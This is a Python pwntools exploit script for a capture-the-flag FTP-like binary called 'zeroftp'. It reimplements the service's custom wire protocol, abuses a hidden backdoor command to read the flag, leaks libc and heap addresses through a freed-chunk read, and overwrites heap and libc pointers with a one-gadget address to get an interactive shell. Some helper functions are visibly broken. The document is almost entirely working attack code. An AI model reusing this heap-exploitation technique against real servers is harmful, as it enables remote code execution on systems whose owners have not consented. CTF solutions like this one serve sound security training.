#!/usr/bin/env python
# encoding: utf-8

__author__  = 'b1gtang'

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './zeroftp'
LIBC64 = './libc-2.23.so'

code = ELF(BINARY)
libc = ELF(LIBC64)

r = process(BINARY, env={'LD_PRELOAD':LIBC64})
#r = remote('192.168.201.15', 13345)

def attach(addr):
    if addr < 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

#### pack
BITS = lambda byte, start, end:((byte>>start)&((1<<(end-start))-1))
BITS_SET = lambda byte, pos: byte|(1<<pos)
BITS_CLR = lambda byte, pos: byte&(~(1<<pos))
BITS_SET_VAL = lambda byte, start, end, val:((byte)&\
(~(((1<<(end-start))-1)<<start))|\
(val<<start))

def zero_pack_bool(data):
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 1)
    info = BITS_SET_VAL(info, 3, 4, data)
    payload = chr(info)
    return payload

def zero_unpack_bool(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0, 3)
    assert zero_basic_types == 1
    data = BITS(zero_info, 3, 4)
    if len(payload) == 1:
        return data
    else:
        return data, payload[1:]

def zero_pack_string(data):
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 2)
    payload  = chr(info)
    payload += data
    payload += '\x00' # null terminal
    return payload

def zero_unpack_string(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0 ,3)
    assert zero_basic_types == 0x2
    data = payload[1:1+payload.index('\x00')]
    if len(payload) == 1 + len(data):
        return data[:-1]
    else:
        return data[:-1], payload[1+len(data):]

def zero_pack_raw(data):
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 3)
    if len(data) <= 15:
        info = BITS_SET_VAL(info, 3, 4, 0)
        info = BITS_SET_VAL(info, 4, 8, len(data))
        payload  = chr(info)
        payload += data
    else:
        len_len = (len(bin(len(data))[2:])-1)/8+1
        raw_len= pack(len(data), 8*len_len, endian='little')
        info = BITS_SET_VAL(info, 3, 4, 1)
        info = BITS_SET_VAL(info, 4, 8, len_len)
        payload  = chr(info)
        payload += raw_len
        payload += data
    return payload

def zero_unpack_raw(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0, 3);
    assert zero_basic_types == 3
    zero_raw_type = BITS(zero_info, 3, 4)
    zero_raw_len  = BITS(zero_info, 4, 8)
    raw_len = 0 
    if (zero_raw_type == 0):
        data = payload[1:1+zero_raw_len]
    else:
        raw_len = unpack(payload[1:1+zero_raw_len], 8*zero_raw_len, endian='little')
        data = payload[1+zero_raw_len:1+zero_raw_len+raw_len]
    if len(payload) == 1 + zero_raw_len + raw_len:
        return data
    else:
        return data, payload[1+len(data):]

def zero_pack_int(data, endian):
    int_len = (len(bin(data)[2:])-1)/8+1
    payload = pack(data, 8*int_len, endian=endian)
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 4)
    info = BITS_SET_VAL(info, 4, 5, int(endian == 'big'))
    info = BITS_SET_VAL(info, 5, 8, int_len-1)
    #print 'xxxxxxxxxx',hex(int_len)
    #print 'xxxxxxxxxx',hex(info)
    payload = chr(info) + payload
    return payload

def zero_unpack_int(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0, 3)
    assert zero_basic_types == 4
    zero_int_type = BITS(zero_info, 3, 4)
    zero_int_len = BITS(zero_info, 5, 8)+1
    zero_int_endian = BITS(zero_info, 4, 5)
    data = unpack(payload[1:1+zero_int_len], 8*zero_int_len, endian='big' if
                zero_int_endian == 1 else 'little')
    if len(payload) == 1 + zero_int_len:
        return data
    else:
        return data, payload[1+zero_int_len:]

def zero_pack_list(data, list_len):
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 5)
    if (list_len <= 15):
        info = BITS_SET_VAL(info, 3, 4, 0)
        info = BITS_SET_VAL(info, 4, 8, list_len)
        payload  = chr(info)
        for i in xrange(list_len):
            payload += data[i]
    else:
        list_len_len = (len(bin(len(list_len))[2:])-1)/8+1
        list_len = pack(len(list_len), 8*list_len_len, endian='little')
        info = BITS_SET_VAL(info, 3, 4, 1)
        info = BITS_SET_VAL(info, 4, 8, list_len_len)
        payload = chr(info)
        for i in xrange(list_len):
            payload = data[i]
    return

def zero_unpack_list(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0, 3)
    assert zero_basic_types == 5
    zero_list_type = BITS(zero_info, 3, 4)
    zero_list_len  = BITS(zero_info, 4, 8)
    ret = []
    if zero_list_type == 0:
        payload = payload[1:]
        for i in xrange(zero_list_len):
            wtf = zero_unpack(payload)
            if type(wtf) == tuple:
                payload = wtf[1]
                ret.append(wtf[0])
            else:
                ret.append(wtf)
            #log.debug('aaaaaaaaa {}'.format(wtf))
    else:
        list_len = unpack(payload[1:1+zero_list_len], 8*zero_list_len, endian='little')
        payload = payload[1+zero_list_len:]
        for i in xrange(list_len):
            wtf = zero_unpack(payload)
            if type(wtf) == tuple:
                payload = wtf[1]
                ret.append(wtf[0])
            else:
                ret.append(wtf)
    return ret,payload

def zero_pack(data, types):
    if zero_basic_types == 'bool':
        ret = zero_pack_bool(data)
    elif zero_basic_types == 'string':
        ret = zero_pack_string(data)
    elif zero_basic_types == 'raw':
        ret = zero_pack_raw(data)
    elif zero_basic_types == 'int':
        ret = zero_pack_int(data)
    elif zero_basic_types == 'list':
        ret = zero_pack_list(payload)
    return ret

def zero_unpack(payload):
    zero_info = ord(payload[0])
    zero_basic_types = BITS(zero_info, 0, 3)
    assert zero_basic_types < 6
    if zero_basic_types == 1:
        log.debug('recv: bool')
        ret =  zero_unpack_bool(payload)
    elif zero_basic_types == 2:
        log.debug('recv: string')
        ret = zero_unpack_string(payload)
    elif zero_basic_types == 3:
        log.debug('recv: raw')
        ret = zero_unpack_raw(payload)
    elif zero_basic_types == 4:
        log.debug('recv: int')
        ret = zero_unpack_int(payload)
    elif zero_basic_types == 5:
        log.debug('recv: list')
        ret = zero_unpack_list(payload)
    return ret

#### recv and send
def zero_recv():
    magic = r.recv(1)
    assert magic == '\xdd'
    data_length = u32(r.recv(4), endian='big')
    #log.info('data_length {}'.format(data_length))
    data = r.recv(data_length)
    #log.info('data {}'.format(hexdump(data)))
    #raw_input()
    data_crc32 = u32(r.recv(4), endian='big')
    #assert crc.crc_32(data) == data_crc32
    #log.info(data.encode('hex'))
    return zero_unpack(data)

def zero_send(data):
    magic = '\xdd'
    data_len = p32(len(data), endian='big')
    data_crc32 = p32(crc.crc_32(data), endian='big')
    payload  = magic + data_len + data + data_crc32
    r.send(payload)

## menu
def zeroftp_login(username, password):
    payload  = zero_pack_int(0x1, endian='big')
    payload += zero_pack_string(username)
    payload += zero_pack_raw(md5sum(password))
    zero_send(payload)
    if zero_recv() == 1:
        log.debug('login success')
    else:
        log.debug('login fail')

def zeroftp_ls(directory):
    payload  = zero_pack_int(0x2, endian='big')
    payload += zero_pack_string(directory)
    zero_send(payload)
    #raw_input()
    ret = zero_recv()
    return ret[0]

def zeroftp_cd(directory):
    payload  = zero_pack_int(0x3, endian='big')
    payload += zero_pack_string(directory)
    zero_send(payload)
    ret = zero_recv()
    return ret 

def zeroftp_mkdir(directory):
    payload  = zero_pack_int(0x4, endian='big')
    payload += zero_pack_string(directory)
    zero_send(payload)
    ret = zero_recv()
    return ret 

def zeroftp_rmdir(directory):
    payload  = zero_pack_int(0x5, endian='big')
    payload += zero_pack_string(directory)
    zero_send(payload)
    ret = zero_recv()
    return ret 

def zeroftp_rdfile(filename):
    payload  = zero_pack_int(0x6, endian='big')
    payload += zero_pack_string(filename)
    zero_send(payload)
    ret = zero_recv()
    return ret 

def zeroftp_wrfile(filename, content):
    payload  = zero_pack_int(0x7, endian='big')
    payload += zero_pack_string(filename)
    payload += zero_pack_raw(content)
    zero_send(payload)
    ret = zero_recv()
    return ret

def zeroftp_rmfile(filename):
    payload  = zero_pack_int(0x8, endian='big')
    payload += zero_pack_string(filename)
    zero_send(payload)
    ret = zero_recv()
    return ret

def zeroftp_fileinfo(pathname, arg2=-1, fileinfo_elem=None):
    payload  = zero_pack_int(0x9, endian='big')
    payload += zero_pack_string(pathname)
    if arg2 != -1:
        payload += zero_pack_bool(arg2)
        payload += zero_pack_int(fileinfo_elem, endian='big')
    zero_send(payload)
    sleep(0.5)
    ret = zero_recv()
    return ret[0] 

def zeroftp_setfileinfo(pathname, fileinfo_elem, arg3):
    payload  = zero_pack_int(0xa, endian='big')
    payload += zero_pack_string(pathname)
    payload += zero_pack_int(fileinfo_elem, endian='big')
    if fileinfo_elem == 0:
        payload += zero_pack_string(arg3)
    else:
        payload += zero_pack_int(arg3, endian='big')
    zero_send(payload)
    ret = zero_recv()
    return ret 

def zeroftp_backdoor(filename):
    payload  = zero_pack_int(0xb, endian='big')
    payload += zero_pack_string(filename)
    #payload += zero_pack_raw('b1111111111111gtang')
    zero_send(payload)
    ret = zero_recv()
    return ret

def zeroftp_exit():
    return 

# for check
def test():
    zeroftp_login('admin', 'admin')
    zeroftp_wrfile('flag','hackedhackedhacked')
    zeroftp_wrfile('test1','hackedhackedhacked')
    zeroftp_wrfile('test2','hackedhackedhacked')
    directory = zeroftp_ls('/')
    log.info('directory {}'.format(directory))
    content = zeroftp_rdfile('flag')
    log.info('file {} content {}'.format('flag', content))
    zeroftp_fileinfo('flag', 0, 1)
    zeroftp_setfileinfo('test1', 0, 'test2')
    zeroftp_setfileinfo('test1', 2, 1)
    zeroftp_mkdir('zzz')
    zeroftp_cd('zzz')
    zeroftp_wrfile('123','hackedhackedhacked')
    zeroftp_wrfile('456','hackedhackedhacked'*8)
    zeroftp_wrfile('abc','hackedhackedhacked')
    content = zeroftp_rdfile('456')
    log.info('file {} content {}'.format('456', content))

    directory = zeroftp_ls('.')
    log.info('directory {}'.format(directory))

    zeroftp_cd('/')
    directory = zeroftp_ls('/')
    log.info('directory {}'.format('flag', directory))
    #attach(0x401BF3)
    #zeroftp_rmdir('/')
    directory = zeroftp_ls('/')
    log.info('directory {}'.format(directory))


# exploit
def re1():
    zeroftp_login('admin', 'admin')
    zeroftp_mkdir('here_is_your_flag')
    zeroftp_backdoor("here_is_your_flag/flag")
    flag = zeroftp_rdfile("here_is_your_flag/flag")
    log.info('get the flag:{}'.format(flag))
    #return flag

def hijack(addr):
    #zeroftp_login('admin', 'admin')
    #zeroftp_wrfile('z'*0x100, 'a'*8)
    zeroftp_wrfile('a'*(0x16-8), 'a'*8)
    zeroftp_setfileinfo('a'*(0x16-8), 4 , 0x00)
    zeroftp_setfileinfo('a'*(0x16-8), 5 , 0x00)
    zeroftp_wrfile('b'*0xf8, 'a'*8)
    for i in xrange(0xe):
        zeroftp_wrfile(chr(ord('c')+i)*0x100, 'a'*8)
    #zeroftp_wrfile(chr(ord('z')+i)*0xe0, 'a'*8)
    print zeroftp_setfileinfo('b'*0xf8, 5 , addr)
    #print zeroftp_setfileinfo('z'*0xc0, 5 , 0xefbeadde11223344)
    #print zeroftp_fileinfo('/')
    payload  = zero_pack_int(0x9, endian='big')
    payload += zero_pack_string('/')
    zero_send(payload)

def leak():
    zeroftp_login('admin', 'admin')

    zeroftp_wrfile('X'*0x100, 'x'*0x100)
    zeroftp_rmfile('X'*0x100)

    payload  = zero_pack_int(0x7, endian='big')
    payload += zero_pack_string('Y'*8)
    # raw
    info = 0
    info = BITS_SET_VAL(info, 0, 3, 3)
    len_len = (len(bin(0xf0)[2:])-1)/8+1
    raw_len= pack(0xf0, 8*len_len, endian='little')
    info = BITS_SET_VAL(info, 3, 4, 1)
    info = BITS_SET_VAL(info, 4, 8, len_len)
    payload += chr(info)
    payload += raw_len
    payload += 'bbbbbbbb'
    zero_send(payload)
    ret = zero_recv()

    ret = zeroftp_rdfile('Y'*8)
    libc.address = u64(ret[0x2a:][:8]) - 0x3c4b98
    heap = u64(ret[0x2a+8:][:8]) - 0x470
    log.info(hex(libc.address))
    log.info(hex(heap))
    zeroftp_rmfile('Y'*0x8)
    return libc.address, heap

def exploit():
    addr = leak()
    #attach(0x401389)
    hijack(unpack(pack(addr+0x4526a,64),64,endian='big'))

#re1()

libc.address , heap = leak()

for i in xrange(0x2e):
    zeroftp_wrfile('%08d' % i, 'x'*0x10)
for i in xrange(0x1e):
    zeroftp_rdfile('%08d' % (i+0x10))

print 'gogogo'
zeroftp_wrfile('%08d' % 0x2e, p64(libc.address+0x4526a)*32)
zeroftp_rdfile('%08d' % 0x2e)

log.debug('tututut')
zeroftp_setfileinfo('/', 2 , heap + 0x110)
#zeroftp_setfileinfo('/', 2 , 0)
zeroftp_setfileinfo('/', 4 , 0)
zeroftp_setfileinfo('/', 5 , libc.address+0x3c56f8)
zeroftp_setfileinfo(p64(libc.address+0x3c36e0)[:6], 0, p64(heap+0x1b90))


r.interactive()

